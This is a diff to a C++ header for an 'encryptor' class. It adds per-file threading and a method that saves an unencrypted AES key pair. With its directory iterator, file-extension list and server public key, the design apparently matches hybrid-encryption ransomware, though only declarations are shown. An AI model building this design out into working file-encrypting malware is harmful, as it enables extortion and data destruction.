@@ -3,13 +3,14 @@
 #define BUTTERFLY_ENCRYPTOR_H
 
 #include <algorithm>
+#include <thread>
 
 #include "crypto/rsaEncryptor.h"
 #include "crypto/aesEncryptor.h"
 #include "crypto/serverPublicKey.h"
 #include "directoryIterator.h"
 #include "fileExtensions.h"
-#include "params.h"
+#include "bflyParams.h"
 
 namespace butterfly
 {
@@ -27,6 +28,7 @@ private:
     int _keySize;
     bool _aesKeyInit;
     std::string _aesKeyDBPath;
+    std::vector<std::thread> _threads;
 
     std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
     std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
@@ -35,6 +37,13 @@ private:
      * Validates the AESKey/AESIV length after the AESKey generation
      */
     void validateAESKeyLength();
+
+    /**
+     * Saves the unencrypted AESKeyPair to the filesystem
+     *
+     * @param aesKeyPair: aesKeyPair string
+     */
+    static void saveUnencryptedAESKeyPair(const std::string &aesKeyPair);
 
 public:
     /**
@@ -77,11 +86,22 @@ public:
     /**
      * Encrypts the final AES Key and IV with RSA
      *
-     * @param aesKeyStr: AES Key or IV String
+     * @param aesKeyPair: AES Key and IV String
      * @param filename: name of the encrypted file
      */
-    void encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename);
+    void encryptFinalAESKeyWithRSA(const std::string &aesKeyPair, const std::string &filename);
 
+    /**
+     * Spawns a new Thread for encrypting the file
+     *
+     * @param filepath: path to the file
+     */
+    void spawnThread(const std::string &filepath);
+
+    /**
+     * Joins the threads in the thread vector
+     */
+    void joinThreads();
 };
 
 } // namespace hybrid
